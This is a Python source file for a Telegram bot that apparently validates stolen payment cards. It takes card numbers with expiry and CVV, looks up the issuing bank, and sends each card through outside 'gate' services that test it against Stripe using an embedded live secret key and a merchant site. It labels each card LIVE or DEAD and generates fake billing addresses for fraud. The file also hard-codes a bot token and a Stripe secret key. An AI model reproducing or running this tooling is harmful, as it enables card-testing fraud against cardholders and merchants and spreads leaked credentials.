import telebot
import httpx
import re
import random
import urllib.parse
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
TOKEN = "8219732532:AAF9klBOym36JPuleNfaGzjZmMNK2_ucWbY" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=25)

# --- REAL CORRELATED ADDRESS DATA ---
REAL_LOCATIONS = {
    "USA": [
        {"city": "Beverly Hills", "st": "CA", "zip": "90210", "flag": "🇺🇸"},
        {"city": "Miami", "st": "FL", "zip": "33101", "flag": "🇺🇸"},
        {"city": "New York", "st": "NY", "zip": "10001", "flag": "🇺🇸"}
    ],
    "UK": [
        {"city": "London", "st": "Greater London", "zip": "E1 6AN", "flag": "🇬🇧"},
        {"city": "Manchester", "st": "Greater Manchester", "zip": "M1 1AE", "flag": "🇬🇧"}
    ],
    "IN": [
        {"city": "Mumbai", "st": "Maharashtra", "zip": "400001", "flag": "🇮🇳"},
        {"city": "Bangalore", "st": "Karnataka", "zip": "560001", "flag": "🇮🇳"}
    ]
}

# --- REAL BIN LOOKUP ---
def get_bin_info(cc):
    bin_num = cc[:6]
    try:
        with httpx.Client(timeout=7.0) as client:
            r = client.get(f"https://lookup.binlist.net/{bin_num}").json()
            bank = r.get('bank', {}).get('name', 'UNKNOWN BANK').upper()
            brand = r.get('scheme', 'UNK').upper()
            level = r.get('type', 'UNK').upper()
            country = r.get('country', {}).get('name', 'UNK')
            return f"🏦 <b>Bank:</b> <code>{bank}</code>\n💳 <b>Brand:</b> <code>{brand} - {level} ({country})</code>"
    except:
        return "🏦 <b>Bank:</b> <code>DATA NOT FOUND</code>\n💳 <b>Brand:</b> <code>GENERIC INFO</code>"

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("💳 Check Card", "🏠 Address Gen")
    return markup

def gate_menu(cc_data):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gt|sk|{cc_data}"),
        types.InlineKeyboardButton("🔥 AUTOSTRIPE", callback_data=f"gt|as|{cc_data}"),
        types.InlineKeyboardButton("🚀 BOTH GATES", callback_data=f"gt|both|{cc_data}")
    )
    return markup

# --- API ENGINE ---
def call_api(gate, full_cc):
    try:
        # URL encode the CC string (handles | character correctly)
        encoded_cc = urllib.parse.quote(full_cc.strip())
        
        if gate == "sk":
            url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={encoded_cc}"
        else:
            url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={encoded_cc}"
        
        with httpx.Client(timeout=35.0, follow_redirects=True) as client:
            resp = client.get(url)
            res_text = resp.text.strip()
            
            if any(x in res_text.lower() for x in ["success", "approved", "cvv live", "charged"]):
                return f"✅ <b>LIVE:</b> <code>{res_text[:100]}</code>"
            return f"❌ <b>DEAD:</b> <code>{res_text[:100]}</code>"
    except Exception as e:
        return f"⚠️ <b>GATE ERROR</b>"

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "<b>💎 V1 PROFESSIONAL ACTIVE</b>", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def addr_prompt(message):
    markup = types.InlineKeyboardMarkup()
    for country in REAL_LOCATIONS.keys():
        markup.add(types.InlineKeyboardButton(f"🌍 {country}", callback_data=f"adr|{country}"))
    bot.send_message(message.chat.id, "<b>🌏 Select Real Address Location:</b>", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def cc_prompt(message):
    bot.send_message(message.chat.id, "<b>📥 Send Card:</b> <code>CC|MM|YY|CVV</code>")

@bot.message_handler(func=lambda m: True)
def auto_detect(message):
    # Extracts cards in standard format
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if cards:
        cc = cards[0]
        bot.send_chat_action(message.chat.id, 'typing')
        bin_info = get_bin_info(cc)
        caption = f"💳 <b>Input:</b> <code>{cc}</code>\n{bin_info}"
        bot.reply_to(message, caption, reply_markup=gate_menu(cc))

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    p = call.data.split("|")
    
    if p[0] == "adr":
        loc = random.choice(REAL_LOCATIONS[p[1]])
        addr = (f"{loc['flag']} <b>{p[1]} REAL ADDRESS</b>\n━━━━━━━━━━━━━━\n"
                f"👤 <b>Name:</b> <code>User_{random.randint(100,999)}</code>\n"
                f"🏠 <b>Street:</b> <code>{random.randint(10, 900)} Park Ave</code>\n"
                f"🏙 <b>City:</b> <code>{loc['city']}</code>\n"
                f"📍 <b>State:</b> <code>{loc['st']}</code>\n"
                f"📮 <b>Zip:</b> <code>{loc['zip']}</code>\n━━━━━━━━━━━━━━")
        bot.edit_message_text(addr, call.message.chat.id, call.message.message_id)

    elif p[0] == "gt":
        gate, cc = p[1], p[2]
        bot.edit_message_text(f"⏳ <b>Processing:</b> <code>{cc}</code>", call.message.chat.id, call.message.message_id)
        
        if gate == "both":
            f1, f2 = executor.submit(call_api, "sk", cc), executor.submit(call_api, "as", cc)
            res = f"<b>Gate 1 (SK):</b> {f1.result()}\n<b>Gate 2 (AS):</b> {f2.result()}"
        else:
            res = f"<b>Result:</b> {call_api(gate, cc)}"
            
        bot.edit_message_text(f"💳 <code>{cc}</code>\n━━━━━━━━━━━━━━\n{res}\n━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id)

print("✅ V1 Final is running with New Token...")
bot.infinity_polling()
